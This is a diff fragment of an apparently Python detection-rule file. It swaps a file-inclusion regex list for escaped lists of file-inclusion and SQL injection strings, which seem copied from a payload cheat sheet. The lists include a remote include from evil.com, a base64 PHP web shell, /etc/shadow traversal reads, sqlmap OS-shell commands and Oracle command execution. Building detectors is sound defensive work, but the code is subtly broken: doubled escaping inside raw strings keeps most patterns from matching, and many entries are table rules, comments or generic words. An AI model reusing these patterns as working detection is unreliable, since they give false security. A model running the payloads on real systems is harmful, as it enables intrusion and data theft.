+        r"(?i)\\{\\{BaseURL\\}\\}/index\\.php\\?option=com_webtv\\&controller=\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./etc/passwd%00",
+        r"(?i)<\\?php",
+        r"(?i)http://example\\.com/index\\.php\\?page=%252e%252e%252fetc%252fpasswd",
+        r"(?i)http://example\\.com/index\\.php\\?page=\\.\\.///////\\.\\.////\\.\\.//////etc/passwd",
+        r"(?i)/etc/grub\\.conf",
+        r"(?i)%0a/bin/cat%20/etc/shadow",
+        r"(?i)/apache2/logs/access\\.log",
+        r"(?i)http://example\\.com/index\\.php\\?page=\\.\\./\\.\\./\\.\\./etc/passwd",
+        r"(?i)http://example\\.com/index\\.php\\?page=%252e%252e%252fetc%252fpasswd%00",
+        r"(?i)\\$file\\ =\\ \\$_GET\\['page'\\];",
+        r"(?i)\\.\\./apache/logs/error\\.log",
+        r"(?i)/etc/crontab",
+        r"(?i)\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./apache/logs/error\\.log",
+        r"(?i)%0a/bin/cat%20/etc/passwd",
+        r"(?i)%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%\\ \\ \\ \\ 25%5c\\.\\.%25%5c\\.\\.%255cboot\\.ini",
+        r"(?i)http://example\\.com/index\\.php\\?page=php://filter/zlib\\.deflate/convert\\.base64\\-encode/resource=/etc/passwd",
+        r"(?i)%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
+        r"(?i)/etc/issue",
+        r"(?i)/etc/apache2/apache2\\.conf",
+        r"(?i)/etc/cron\\.allow",
+        r"(?i)/apache/logs/access_log",
+        r"(?i)/etc/httpd/conf/httpd\\.conf",
+        r"(?i)/etc/lilo\\.conf",
+        r"(?i)/etc/httpd/access\\.conf",
+        r"(?i)\\.\\./\\.\\./\\.\\./apache/logs/access\\.log",
+        r"(?i)\\.\\./\\.\\./apache/logs/error\\.log",
+        r"(?i)/etc/aliases",
+        r"(?i)/%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%00",
+        r"(?i)/etc/hosts\\.allow",
+        r"(?i)/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+        r"(?i)http://example\\.com/index\\.php\\?page=\\.\\./\\.\\./\\.\\./\\[ADD\\ MORE\\]\\.\\./\\.\\./\\.\\./\\.\\./etc/passwd",
+        r"(?i)http://example\\.com/index\\.php\\?page=http://evil\\.com/shell\\.txt",
+        r"(?i)http://example\\.com/index\\.php\\?page=expect://id",
+        r"(?i)\\.\\./\\.\\./apache/logs/access\\.log",
+        r"(?i)/etc/at\\.allow",
+        r"(?i)/etc/anacrontab",
+        r"(?i)/etc/groups",
+        r"(?i)zip\\ payload\\.zip\\ payload\\.php;",
+        r"(?i)/etc/modules\\.conf",
+        r"(?i)http://example\\.net/\\?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
+        r"(?i)/etc/cups/cupsd\\.conf",
+        r"(?i)/etc/httpd/php\\.ini",
+        r"(?i)curl\\ \"http://example\\.com/index\\.php\\?page=php://filter/convert\\.base64\\-encode/resource=index\\.php\"\\ \\|\\ base64\\ \\-d\\ >\\ index\\.php",
+        r"(?i)/etc/shadow",
+        r"(?i)/etc/ftpaccess",
+        r"(?i)/etc/my\\.conf",
+        r"(?i)\\#\\ executed\\ PHP\\ code:\\ <\\?=`\\$_GET\\[0\\]`;;\\?>",
+        r"(?i)\\./kadimus\\ \\-u\\ \"https://example\\.com/index\\.php\\?page=php://input%00\"\\ \\ \\-C\\ '<\\?php\\ echo\\ shell_exec\\(\"id\"\\);\\ \\?>'\\ \\-T\\ input",
+        r"(?i)=3D\\ “/\\.\\.”\\ \\.\\ “%2f\\.\\.",
+        r"(?i)/etc/inittab",
+        r"(?i)http://example\\.com/index\\.php\\?page=php://filter/convert\\.iconv\\.utf\\-8\\.utf\\-16/resource=index\\.php",
+        r"(?i)http://example\\.com/index\\.php\\?page=\\.\\./\\.\\./\\.\\./etc/passwd/\\./\\./\\./\\./\\./\\.\\[ADD\\ MORE\\]",
+        r"(?i)/etc/hosts",
+        r"(?i)\\.\\.%2F\\.\\.%2F\\.\\.%2F%2F\\.\\.%2F\\.\\.%2Fetc/shadow",
+        r"(?i)http://example\\.com/index\\.php\\?page=php://filter/convert\\.base64\\-encode/resource=index\\.php",
+        r"(?i)/etc/cron\\.deny",
+        r"(?i)\\.\\./\\.\\./\\.\\./\\.\\./apache/logs/access\\.log",
+        r"(?i)%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow",
+        r"(?i)/etc/ftpchroot",
+        r"(?i)/apache/logs/error\\.log",
+        r"(?i)/etc/exports",
+        r"(?i)\\.\\.%2F\\.\\.%2F\\.\\.%2F\\.\\.%2F\\.\\.%2F\\.\\.%2F\\.\\.%2F\\.\\.%2F\\.\\.%2F\\.\\.%2F\\.\\.%2Fetc%2Fshadow",
+        r"(?i)/etc/httpd/logs/access\\.log",
+        r"(?i)\\.\\.%2F\\.\\.%2F\\.\\.%2F%2F\\.\\.%2F\\.\\.%2Fetc/passwd",
+        r"(?i)\\\\\\\\\\&apos;/bin/cat%20/etc/passwd\\\\\\\\\\&apos;",
+        r"(?i)/apache2/logs/access_log",
+        r"(?i)/etc/httpd/logs/error\\.log",
+        r"(?i)/etc/inetd\\.conf",
+        r"(?i)http://example\\.com/index\\.php\\?page=/%5C\\.\\./%5C\\.\\./%5C\\.\\./%5C\\.\\./%5C\\.\\./%5C\\.\\./%5C\\.\\./%5C\\.\\./%5C\\.\\./%5C\\.\\./%5C\\.\\./etc/passwd",
+        r"(?i)\\.\\./\\.\\./\\.\\./\\.\\./apache/logs/error\\.log",
+        r"(?i)/etc/logrotate\\.d/ftp",
+        r"(?i)/etc/httpd/httpd\\.conf",
+        r"(?i)%00\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./etc/passwd",
+        r"(?i)/etc/httpd/logs/error_log",
+        r"(?i)/\\.\\.\\./\\.\\.\\./\\.\\.\\./\\.\\.\\./\\.\\.\\./",
+        r"(?i)http://example\\.com/index\\.php\\?page=php://filter/read=string\\.rot13/resource=index\\.php",
+        r"(?i)/apache/logs/access\\.log",
+        r"(?i)\\?>",
+        r"(?i)http://example\\.com/index\\.php\\?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00",
+        r"(?i)/etc/my\\.cnf",
+        r"(?i)allow_url_include\\ =\\ On",
+        r"(?i)%00/etc/shadow%00",
+        r"(?i)http://example\\.com/index\\.php\\?page=\\.\\./\\.\\./\\.\\./etc/passwd\\\\\\.\\\\\\.\\\\\\.\\\\\\.\\\\\\.\\\\\\.\\[ADD\\ MORE\\]",
+        r"(?i)/etc/passwd",
+        r"(?i)/etc/hosts\\.deny",
+        r"(?i)/%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.%25%5c\\.\\.winnt/desktop\\.ini",
+        r"(?i)/apache2/logs/error_log",
+        r"(?i)\\\\\\\\\\&apos;/bin/cat%20/etc/shadow\\\\\\\\\\&apos;",
+        r"(?i)/etc/lighttpd\\.conf",
+        r"(?i)\\$\\ python3\\ php_filter_chain_generator\\.py\\ \\-\\-chain\\ '<\\?php\\ phpinfo\\(\\);\\?>'",
+        r"(?i)/apache2/logs/error\\.log",
+        r"(?i)include\\(\\$file\\);",
+        r"(?i)\\#\\ vulnerable\\ parameter:\\ file",
+        r"(?i)http://example\\.com/index\\.php\\?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+        r"(?i)/etc/chrootUsers",
+        r"(?i)mv\\ payload\\.zip\\ shell\\.jpg;",
+        r"(?i)/etc/fstab",
+        r"(?i)\\.\\.%2F\\.\\.%2F\\.\\.%2F%2F\\.\\.%2F\\.\\.%2F%2Fvar%2Fnamed",
+        r"(?i)%00\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./etc/shadow",
+        r"(?i)/etc/motd",
+        r"(?i)/etc/mtab",
+        r"(?i)/etc/lsb\\-release",
+        r"(?i)\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./apache/logs/access\\.log",
+        r"(?i)admin/access_log",
+        r"(?i)curl\\ \\-X\\ POST\\ \\-\\-data\\ \"<\\?php\\ echo\\ shell_exec\\('id'\\);\\ \\?>\"\\ \"https://example\\.com/index\\.php\\?page=php://input%00\"\\ \\-k\\ \\-v",
+        r"(?i)http://example\\.com/index\\.php\\?page=pHp://FilTer/convert\\.base64\\-encode/resource=index\\.php",
+        r"(?i)\\.\\.%2F\\.\\.%2F\\.\\.%2F\\.\\.%2F\\.\\.%2F\\.\\.%2F\\.\\.%2F\\.\\.%2F\\.\\.%2F\\.\\.%2F\\.\\.%2Fetc%2Fpasswd",
+        r"(?i)/etc/bootptab",
+        r"(?i)/etc/logrotate\\.d/vsftpd\\.log",
+        r"(?i)http://example\\.com/index\\.php\\?page=\\.\\./\\.\\./\\.\\./etc/passwd\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\[ADD\\ MORE\\]",
+        r"(?i)\\#\\ executed\\ command:\\ id",
     ],
-    
-    "Remote File Inclusion": [
-        # Protocol wrappers
-        r"(?i)(php:\/\/(filter|input|output|fd|memory|temp|stdin|stdout|stderr))",
-        r"(?i)(file:\/\/|zip:\/\/|zlib:\/\/|data:\/\/)",
-        r"(?i)(expect:\/\/|glob:\/\/|phar:\/\/)",
-        r"(?i)(ogg:\/\/|rar:\/\/)",
-        
-        # Remote URL inclusion
-        r"(?i)(https?:\/\/[^\s\"'<>]+\.(txt|php|asp|aspx|jsp|xml))",
-        r"(?i)(ftp:\/\/[^\s\"'<>]+)",
-        
-        # Null byte injection
-        r"(%00|\\0|0x00)",
-        r"(?i)(\.php%00|\.asp%00|\.jsp%00)",
-        
-        # Filter bypass
-        r"(?i)(php:\/\/filter\/convert\.base64-encode\/resource=)",
-        r"(?i)(php:\/\/filter\/read=string\.rot13\/resource=)",
+
+
+    "SQL Injection": [
+        r"(?i)\\|\\ SQL\\ Query\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\|\\ Description\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\|",
+        r"(?i)SELECT\\ name\\ FROM\\ <DBNAME>\\.\\.sysobjects\\ WHERE\\ xtype='U'",
+        r"(?i)SELECT\\ table_catalog,\\ table_name\\ FROM\\ information_schema\\.columns",
+        r"(?i)SELECT\\ query_to_xml\\('select\\ \\*\\ from\\ pg_user',true,true,''\\);\\ \\-\\-\\ returns\\ all\\ the\\ results\\ as\\ a\\ single\\ xml\\ row",
+        r"(?i)\\-\\-\\ \\(Only\\ works\\ in\\ MSSQL\\ 2017\\+\\)",
+        r"(?i)'\\|\\|'DERP",
+        r"(?i)\\-\\-\\ Change\\ delimiter\\ value\\ such\\ as\\ ',\\ '\\ to\\ anything\\ else\\ you\\ want\\ =>\\ master,\\ tempdb,\\ model,\\ msdb",
+        r"(?i)CAST\\(chr\\(126\\)\\|\\|\\(SELECT\\ column_name\\ FROM\\ information_schema\\.columns\\ WHERE\\ table_name='data_table'\\ LIMIT\\ 1\\ OFFSET\\ data_offset\\)\\|\\|chr\\(126\\)\\ AS\\ NUMERIC\\)\\-\\-",
+        r"(?i)SELECT\\ table_catalog,\\ column_name\\ FROM\\ information_schema\\.columns",
+        r"(?i)SELECT\\ STRING_AGG\\(name,\\ ',\\ '\\)\\ FROM\\ master\\.\\.sysdatabases;",
+        r"(?i)\\-\\-\\ list\\ column\\ names\\ and\\ types\\ for\\ master\\.\\.sometable",
+        r"(?i)SELECT\\ owner,\\ table_name\\ FROM\\ all_tables;",
+        r"(?i)sqlmap\\ \\-u\\ \"http://example\\.com/\\?id=1\"\\ \\-p\\ id\\ \\-\\-file\\-write=/root/\\.ssh/id_rsa\\.pub\\ \\-\\-file\\-destination=/home/user/\\.ssh/",
+        r"(?i)'\\ and\\ substr\\(version\\(\\),1,10\\)\\ =\\ 'PostgreXXX'\\ and\\ '1\\ \\ \\-\\-\\ FALSE",
+        r"(?i)username:\\ admin'\\ ALLOW\\ FILTERING;\\ %00",
+        r"(?i)select\\ case\\ when\\ substring\\(column,1,1\\)='1'\\ then\\ pg_sleep\\(5\\)\\ else\\ pg_sleep\\(0\\)\\ end\\ from\\ table_name\\ limit\\ 1",
+        r"(?i)\\|\\ \\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\ \\|\\ \\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\ \\|",
+        r"(?i)\\|\\ `\\#`\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\|\\ Hash\\ comment\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\|",
+        r"(?i)password:\\ \\*/and\\ pass>'",
+        r"(?i)BEGIN",
+        r"(?i)\\|\\ `'\\ OR\\ if\\(1/\\(length\\(\\(select\\('a'\\)\\)\\)\\-1\\)=1,true,false\\)\\ OR\\ '`\\ \\|\\ Division\\ by\\ zero\\ \\ \\ \\ \\ \\|",
+        r"(?i)\\-\\-\\ Returns\\ all\\ in\\ one\\ xml\\-formatted\\ string",
+        r"(?i)\\-\\-\\ Returns\\ all\\ in\\ one\\ xml\\-formatted\\ string\\.",
+        r"(?i)SELECT\\ name\\ FROM\\ master\\.sys\\.databases;",
+        r"(?i)'%2B'HERP",
+        r"(?i)select\\ \\*\\ from\\ dba_java_policy",
+        r"(?i)\\-\\-proxy=\"http://\\[username\\]:\\[password\\]@\\[proxy_ip\\]:\\[proxy_port\\]\"",
+        r"(?i)select\\ xmlagg\\(xmlrow\\(table_schema\\)\\)\\ from\\ \\(select\\ distinct\\(table_schema\\)\\ from\\ sysibm\\.tables\\)",
+        r"(?i)'\\ and\\ 1=cast\\(\\(SELECT\\ table_name\\ FROM\\ information_schema\\.tables\\ LIMIT\\ 1\\ OFFSET\\ data_offset\\)\\ as\\ int\\)\\ and\\ '1'='1",
+        r"(?i)\\-\\-\\ May\\ need\\ CAST\\(xml2clob\\(…\\ AS\\ varchar\\(500\\)\\)\\ to\\ display\\ the\\ result\\.",
+        r"(?i)page\\.asp\\?id=1'\\ or\\ 1=1\\ \\-\\-\\ true",
+        r"(?i)AND\\ 1337=\\(CASE\\ WHEN\\ \\(1=1\\)\\ THEN\\ DBMS_PIPE\\.RECEIVE_MESSAGE\\('RANDSTR',10\\)\\ ELSE\\ 1337\\ END\\)",
+        r"(?i)sqlmap\\ \\-r\\ 1\\.txt\\ \\-dbms\\ MySQL\\ \\-second\\-order\\ \"http://<IP/domain>/joomla/administrator/index\\.php\"\\ \\-D\\ \"joomla\"\\ \\-dbs",
+        r"(?i)select\\ xml2clob\\(xmelement\\(name\\ t,\\ table_schema\\)\\)\\ from\\ sysibm\\.tables",
+        r"(?i)AND\\ \\[RANDNUM\\]=DBMS_PIPE\\.RECEIVE_MESSAGE\\('\\[RANDSTR\\]',\\[SLEEPTIME\\]\\)",
+        r"(?i)`\\+HERP",
+        r"(?i)'%20'HERP",
+        r"(?i)\\#\\#\\ BigQuery\\ Comment",
+        r"(?i)SELECT\\ DB_NAME\\(N\\);",
+        r"(?i)SELECT\\ COLUMN_NAME,DATA_TYPE\\ FROM\\ SYS\\.ALL_TAB_COLUMNS\\ WHERE\\ TABLE_NAME='<TABLE_NAME>'\\ AND\\ OWNER='<DBNAME>'",
+        r"(?i)SELECT\\ name\\ FROM\\ syscolumns\\ WHERE\\ id\\ =\\ \\(SELECT\\ id\\ FROM\\ sysobjects\\ WHERE\\ name\\ =\\ 'mytable'\\);",
+        r"(?i)\\-\\-proxy=\"socks4://user:pass@127\\.0\\.0\\.1:1080\"",
+        r"(?i)SELECT\\ DISTINCT\\ owner\\ FROM\\ all_tables;",
+        r"(?i)SELECT\\ DBMS_JAVA_TEST\\.FUNCALL\\('oracle/aurora/util/Wrapper','main','/bin/bash','\\-c','/bin/ls>/tmp/OUT2\\.LST'\\)\\ from\\ dual",
+        r"(?i)SELECT\\ column_name\\ FROM\\ all_tab_columns\\ WHERE\\ table_name\\ =\\ 'blah';",
+        r"(?i)\\#\\#\\ BigQuery\\ Error\\ Based",
+        r"(?i)CAST\\(chr\\(126\\)\\|\\|VERSION\\(\\)\\|\\|chr\\(126\\)\\ AS\\ NUMERIC\\)",
+        r"(?i)page\\.asp\\?id=1\\ and\\ 1=2\\ \\-\\-\\ false",
+        r"(?i)\\-\\-\\ use\\ xtype\\ =\\ 'V'\\ for\\ views",
+        r"(?i)SELECT\\ DBMS_JAVA_TEST\\.FUNCALL\\('oracle/aurora/util/Wrapper','main','c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\cmd\\.exe','/c',\\ 'dir\\ >c:\\\\test\\.txt'\\)\\ FROM\\ DUAL",
+        r"(?i)SELECT\\ name\\ FROM\\ someotherdb\\.\\.sysobjects\\ WHERE\\ xtype\\ =\\ 'U';",
+        r"(?i)\\|\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\|\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\|",
+        r"(?i)SELECT\\ OWNER,TABLE_NAME\\ FROM\\ SYS\\.ALL_TABLES\\ WHERE\\ OWNER='<DBNAME>'",
+        r"(?i)username:\\ admin'/\\*",
+        r"(?i)'\\ and\\ 1=cast\\(\\(SELECT\\ concat\\('DATABASE:\\ ',current_database\\(\\)\\)\\)\\ as\\ int\\)\\ and\\ '1'='1",
+        r"(?i)sqlmap\\ \\-u\\ \"http://example\\.com/\\?id=1\"\\ \\ \\-p\\ id\\ \\-\\-suffix=\"\\-\\-\\ \"",
+        r"(?i)sqlmap\\ \\-u\\ \"http://www\\.target\\.com/page\\.php\\?id=1\"\\ \\-\\-proxy=\"http://127\\.0\\.0\\.1:8080\"\\ \\-\\-proxy\\-cred=\"user:pass\"",
+        r"(?i)SELECT\\ product_name,\\ product_price\\ FROM\\ products\\ WHERE\\ product_id\\ =\\ 'input_id';",
+        r"(?i)SELECT\\ chr\\(65\\)\\|\\|chr\\(68\\)\\|\\|chr\\(82\\)\\|\\|chr\\(73\\)\\ FROM\\ sysibm\\.sysdummy1",
+        r"(?i)\\|\\ Type\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\|\\ Description\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\|",
+        r"(?i)sqlmap\\ \\-u\\ \"http://example\\.com/\\?id=1\"\\ \\ \\-p\\ id\\ \\-\\-os\\-shell",
+        r"(?i)\\-\\-proxy=\"socks5://user:pass@127\\.0\\.0\\.1:1080\"",
+        r"(?i);\\(select\\ 1\\ from\\ pg_sleep\\(5\\)\\)",
+        r"(?i)\\#\\#\\ BigQuery\\ Boolean\\ Based",
+        r"(?i)select\\ case\\ when\\ substring\\(datname,1,1\\)='1'\\ then\\ pg_sleep\\(5\\)\\ else\\ pg_sleep\\(0\\)\\ end\\ from\\ pg_database\\ limit\\ 1",
+        r"(?i)SELECT\\ COL_NAME\\(OBJECT_ID\\('<DBNAME>\\.<TABLE_NAME>'\\),\\ <INDEX>\\)",
+        r"(?i)SELECT\\ database_to_xmlschema\\(true,true,''\\);\\ \\-\\-\\ dump\\ the\\ current\\ db\\ to\\ an\\ XML\\ schema",
+        r"(?i)\\-\\-\\ for\\ the\\ current\\ DB\\ only",
+        r"(?i)\\|\\|\\(select\\ 1\\ from\\ pg_sleep\\(5\\)\\)",
+        r"(?i)/\\*\\ Cassandra\\ Comment\\ \\*/",
+        r"(?i)'\\ and\\ substr\\(version\\(\\),1,10\\)\\ =\\ 'PostgreSQL'\\ and\\ '1\\ \\ \\-\\-\\ TRUE",
+        r"(?i)\\|\\ \\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\ \\|\\ \\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\ \\|",
+        r"(?i)SELECT\\ DBMS_JAVA\\.RUNJAVA\\('oracle/aurora/util/Wrapper\\ /bin/bash\\ \\-c\\ /bin/ls>/tmp/OUT\\.LST'\\)\\ FROM\\ DUAL",
+        r"(?i)\\-\\-\\ Same\\ but\\ without\\ repeated\\ elements",
+        r"(?i)sqlmap\\ \\-u\\ \"http://example\\.com/\\?id=1\"\\ \\ \\-p\\ id\\ \\-\\-os\\-pwn",
+        r"(?i)SELECT\\ name\\ FROM\\ master\\.\\.sysdatabases;",
+        r"(?i)\\|\\ `select\\ CAST\\(@@project_id\\ AS\\ INT64\\)`\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\|\\ Casting\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\|",
+        r"(?i)exec\\ dbms_java\\.grant_permission\\('SCOTT',\\ 'SYS:java\\.io\\.FilePermission','<<ALL\\ FILES>>','execute'\\);",
+        r"(?i)\\|\\ `/\\*\\ PostgreSQL\\ Comment\\ \\*/`\\ \\|\\ C\\-style\\ comment\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\|",
+        r"(?i)\\|\\ SQL\\ Query\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\|\\ Description\\ \\|",
+        r"(?i)SELECT\\ table_name\\ FROM\\ all_tables;",
+        r"(?i)select\\ case\\ when\\ substring\\(table_name,1,1\\)='a'\\ then\\ pg_sleep\\(5\\)\\ else\\ pg_sleep\\(0\\)\\ end\\ from\\ information_schema\\.tables\\ limit\\ 1",
+        r"(?i)'\\+'herp",
+        r"(?i)CAST\\(chr\\(126\\)\\|\\|\\(SELECT\\ table_name\\ FROM\\ information_schema\\.tables\\ LIMIT\\ 1\\ offset\\ data_offset\\)\\|\\|chr\\(126\\)\\ AS\\ NUMERIC\\)\\-\\-",
+        r"(?i)sql\\ =\\ \"SELECT\\ \\*\\ FROM\\ admin\\ WHERE\\ pass\\ =\\ '\"\\.md5\\(\\$password,true\\)\\.\"'\";",
+        r"(?i)sqlmap\\ \\-u\\ \"http://www\\.target\\.com\"\\ \\-\\-proxy=\"http://127\\.0\\.0\\.1:8080\"",
+        r"(?i)admin'\\ AND\\ 1=0\\ UNION\\ ALL\\ SELECT\\ 'admin',\\ '161ebd7d45089b3446ee4e0d86dbcf92'\\-\\-",
+        r"(?i)sql1\\ =\\ \"SELECT\\ \\*\\ FROM\\ admin\\ WHERE\\ pass\\ =\\ '\"\\.md5\\(\"ffifdyop\",\\ true\\)\\.\"'\";",
+        r"(?i)SELECT\\ STRING_AGG\\(name,\\ ',\\ '\\)\\ FROM\\ master\\.\\.sysobjects\\ WHERE\\ xtype\\ =\\ 'U';",
+        r"(?i)sqlmap\\ \\-u\\ \"http://targetwebsite\\.com/vulnerablepage\\.php\\?id=1\"\\ \\-\\-tamper=<tamper\\-script\\-name>",
+        r"(?i)sql1\\ =\\ \"SELECT\\ \\*\\ FROM\\ admin\\ WHERE\\ pass\\ =\\ ''or'6�\\]��!r,��b'\";",
+        r"(?i)select\\ xmlagg\\(xmlrow\\(table_schema\\)\\)\\ from\\ sysibm\\.tables",
+        r"(?i)CAST\\(chr\\(126\\)\\|\\|\\(SELECT\\ data_column\\ FROM\\ data_table\\ LIMIT\\ 1\\ offset\\ data_offset\\)\\|\\|chr\\(126\\)\\ AS\\ NUMERIC\\)",
+        r"(?i)exec\\ dbms_java\\.grant_permission\\('SCOTT','SYS:java\\.lang\\.RuntimePermission',\\ 'readFileDescriptor',\\ ''\\);",
+        r"(?i)SELECT\\ \\*\\ FROM\\ users\\ WHERE\\ username\\ =\\ ''\\ OR\\ '1'='1'\\ AND\\ password\\ =\\ '';",
+        r"(?i)\\-\\-\\ for\\ N\\ =\\ 0,\\ 1,\\ 2,\\ …",
+        r"(?i)SELECT\\ OWNER\\ FROM\\ \\(SELECT\\ DISTINCT\\(OWNER\\)\\ FROM\\ SYS\\.ALL_TABLES\\)",
+        r"(?i)select\\ 1\\ from\\ pg_sleep\\(5\\)",
+        r"(?i)'\\ 'DERP",
+        r"(?i)SELECT\\ table_name\\ FROM\\ information_schema\\.tables\\ WHERE\\ table_catalog='<DBNAME>'",
+        r"(?i)page\\.asp\\?id=1\\ or\\ 1=1\\ \\-\\-\\ true",
+        r"(?i)'\\ and\\ 1=cast\\(\\(SELECT\\ data_column\\ FROM\\ data_table\\ LIMIT\\ 1\\ OFFSET\\ data_offset\\)\\ as\\ int\\)\\ and\\ '1'='1",
+        r"(?i)SELECT\\ owner,\\ table_name\\ FROM\\ all_tab_columns\\ WHERE\\ column_name\\ LIKE\\ '%PASS%';",
+        r"(?i)SELECT\\ \\*\\ FROM\\ users\\ WHERE\\ username\\ =\\ 'user'\\ AND\\ password\\ =\\ 'pass';",
+        r"(?i)password:\\ ANY",
+        r"(?i)'\\ and\\ 1=cast\\(\\(SELECT\\ column_name\\ FROM\\ information_schema\\.columns\\ WHERE\\ table_name='data_table'\\ LIMIT\\ 1\\ OFFSET\\ data_offset\\)\\ as\\ int\\)\\ and\\ '1'='1",
+        r"(?i)\\|\\ `SELECT\\ schema_name\\ FROM\\ INFORMATION_SCHEMA\\.SCHEMATA`\\ \\|\\ Gathering\\ all\\ dataset\\ names\\ \\|",
+        r"(?i)'\\ OR\\ '1'='1",
+        r"(?i)\\|\\ `SELECT\\ @@project_id`\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\|\\ Gathering\\ project\\ id\\ \\|",
+        r"(?i)SELECT\\ \\*\\ FROM\\ users\\ WHERE\\ user\\ =\\ 'admin'/\\*'\\ AND\\ pass\\ =\\ '\\*/and\\ pass>''\\ ALLOW\\ FILTERING;",
+        r"(?i)'\\|\\|QCMDEXC\\('QSH\\ CMD\\(''system\\ dspusrprf\\ PROFILE''\\)'\\)",
+        r"(?i)'\\ and\\ \\(SELECT\\ count\\(\\*\\)\\ from\\ sysibm\\.columns\\ t1,\\ sysibm\\.columns\\ t2,\\ sysibm\\.columns\\ t3\\)>0\\ and\\ \\(select\\ ascii\\(substr\\(user,1,1\\)\\)\\ from\\ sysibm\\.sysdummy1\\)=68",
+        r"(?i)select\\ \\*\\ from\\ user_java_policy",
+        r"(?i)'\\ or\\ 1=1\\ limit\\ 1\\ \\-\\-",
+        r"(?i)sqlmap\\ \\-u\\ \"http://example\\.com/\"\\ \\-\\-crawl=1\\ \\-\\-random\\-agent\\ \\-\\-batch\\ \\-\\-forms\\ \\-\\-threads=5\\ \\-\\-level=5\\ \\-\\-risk=3",
+        r"(?i)SELECT\\ name\\ FROM\\ master\\.\\.sysobjects\\ WHERE\\ xtype\\ =\\ 'U';",
+        r"(?i)\\-\\-proxy=\"http://user:pass@127\\.0\\.0\\.1:8080\"",
+        r"(?i)exec\\ dbms_java\\.grant_permission\\('SCOTT','SYS:java\\.lang\\.RuntimePermission',\\ 'writeFileDescriptor',\\ ''\\);",
